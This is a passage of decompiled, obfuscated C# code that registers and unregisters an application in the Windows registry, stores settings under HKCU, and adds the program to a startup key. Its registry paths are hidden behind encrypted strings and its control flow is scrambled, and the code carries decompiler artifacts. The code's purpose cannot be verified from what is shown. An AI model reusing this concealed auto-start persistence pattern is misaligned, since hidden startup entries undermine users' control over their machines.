					registryKey.SetValue("", Application.get_ExecutablePath() + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2204));
					num2 = 8;
					goto IL_00b2;
				case 0:
					registryKey.SetValue("", Application.get_ExecutablePath() + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2200));
					num = 3;
					continue;
				default:
					registryKey.SetValue("", _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2188), RegistryValueKind.String);
					num = 6;
					if (true)
					{
						continue;
					}
					goto case 6;
				case 6:
					registryKey.SetValue(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2192), Application.get_ExecutablePath(), RegistryValueKind.String);
					num = 9;
					continue;
				case 2:
				case 7:
					registryKey = registryKey.CreateSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2196));
					num = 0;
					if (true)
					{
						continue;
					}
					return;
				case 12:
					return;
					IL_00b2:
					num = num2;
					continue;
				}
				break;
			}
			goto IL_0146;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2212), _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2164), (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void UnRegisterApp()
	{
		//Discarded unreachable code: IL_0005, IL_00cd
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(112))
		{
			return;
		}
		try
		{
			RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2176))!.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2180))!.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2184), writable: true);
			int num = 0;
			if (1 == 0)
			{
				goto IL_0060;
			}
			goto IL_00d6;
			IL_00d6:
			int num2 = num;
			goto IL_00da;
			IL_00da:
			while (true)
			{
				switch (num2)
				{
				case 1:
				case 3:
					break;
				case 0:
					registryKey.DeleteSubKeyTree(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2164));
					num2 = 4;
					continue;
				case 4:
					registryKey = Registry.ClassesRoot.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2176))!.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2184), writable: true);
					goto default;
				default:
					_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
					if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						num2 = 1;
						continue;
					}
					goto IL_010a;
				case 2:
				case 5:
					registryKey.DeleteSubKeyTree(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2164));
					break;
				case 6:
					return;
				}
				break;
			}
			goto IL_0060;
			IL_0060:
			MessageBox.Show(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2216), _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2164), (MessageBoxButtons)0, (MessageBoxIcon)64);
			num2 = 6;
			goto IL_00da;
			IL_010a:
			num = 5;
			goto IL_00d6;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2212), _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2164), (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _008B_0091_0087_008B_008B_008B_0087_0090_0094_0089_0087_0093_008C_0090_0090_0090_0088_0094_0089_0090_008C_008B_0095_008A_0087_0086_0089_0092_0091_008B_008E_008F_0094_0094_008E_0088
{
	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string Read(string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_007a
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 0;
		int num;
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 4;
			goto IL_007f;
		}
		int num2 = 5;
		goto IL_0087;
		IL_0083:
		int num3;
		num2 = num3;
		goto IL_0087;
		IL_0066:
		num = 6;
		goto IL_007f;
		IL_0087:
		RegistryKey currentUser = default(RegistryKey);
		RegistryKey registryKey = default(RegistryKey);
		bool flag = default(bool);
		string result = default(string);
		switch (num2)
		{
		case 6:
			break;
		case 0:
		case 4:
			currentUser = Registry.CurrentUser;
			goto case 1;
		case 1:
		case 5:
			registryKey = currentUser.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2220));
			num3 = 3;
			if (false)
			{
				goto case 2;
			}
			goto IL_0083;
		case 2:
			if (!flag)
			{
				try
				{
					return (string)registryKey.GetValue(_0020);
				}
				catch (Exception)
				{
					return null;
				}
			}
			goto IL_0066;
		case 3:
			flag = registryKey == null;
			goto case 2;
		default:
			goto IL_00ac;
		case 7:
			return result;
		}
		result = null;
		num = 7;
		goto IL_007f;
		IL_00ac:
		num = 2;
		goto IL_007f;
		IL_007f:
		num3 = num;
		goto IL_0083;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static bool Write(string _0020, object _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0051
		//IL_0006: Incompatible stack heights: 0 vs 1
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
			int num;
			if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
			{
				num = 3;
				goto IL_005e;
			}
			int num2 = 2;
			if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
			{
				goto IL_005a;
			}
			goto IL_0090;
			IL_005e:
			RegistryKey registryKey = default(RegistryKey);
			switch (num)
			{
			default:
				registryKey.SetValue(_0020, _0020);
				num2 = 4;
				goto IL_005a;
			case 0:
			case 3:
				registryKey = currentUser.CreateSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2220));
				goto default;
			case 4:
				break;
			}
			goto IL_0090;
			IL_0090:
			return true;
			IL_005a:
			num = num2;
			goto IL_005e;
		}
		catch (Exception)
		{
			return false;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void RegisterInStartup(bool _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0063
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0048: Incompatible stack heights: 0 vs 1
		int num = 3;
		bool flag = default(bool);
		RegistryKey registryKey = default(RegistryKey);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 0:
				case 1:
					flag = _0020;
					goto case 2;
				case 3:
					registryKey = Registry.CurrentUser.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(196), writable: true);
					_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
					if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						goto IL_001c;
					}
					num = 0;
					break;
				case 2:
				case 4:
					if (flag)
					{
						goto case 5;
					}
					try
					{
						registryKey.DeleteValue(Assembly.GetExecutingAssembly().GetName().Name);
						return;
					}
					catch
					{
						return;
					}
				default:
					num = 5;
					break;
				case 5:
					registryKey.SetValue(Assembly.GetExecutingAssembly().GetName().Name, _0020);
					num = 6;
					if (1 == 0)
					{
						return;
					}
					break;
				case 6:
					return;
				}
				break;
				IL_001c:
				num2 = 4;
			}
		}
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
